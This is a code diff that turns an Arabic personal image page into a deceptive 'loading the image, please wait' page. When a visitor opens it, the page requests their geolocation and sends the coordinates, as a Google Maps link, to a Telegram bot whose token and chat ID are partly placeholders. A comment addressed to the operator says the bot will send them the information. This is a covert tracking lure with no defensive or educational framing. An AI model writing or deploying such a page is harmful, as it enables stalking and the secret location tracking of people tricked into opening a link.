@@ -2,9 +2,31 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>الصفحة الشخصية</title>
+    <title>جاري التحميل...</title>
 </head>
-<body style="margin:0;">
-    <img src="https://picsum.photos/400" style="width:100%; height:auto;">
+<body>
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation);
+            }
+        };
+
+        function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            // هنا سنضع رابط البوت الذي سيرسل لك المعلومات
+            const token = "8639074453:AAGcsNWFB-_هنا"; 
+            const chat_id = "7323283649_هنا";
+            const message = `تم تحديد الموقع بنجاح: 
+            الرابط: https://www.google.com/maps?q=${lat},${lon}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
+        }
+    </script>
+    <h1>جاري تحميل الصورة... يرجى الانتظار</h1>
 </body>
+</html>
+
 </html>
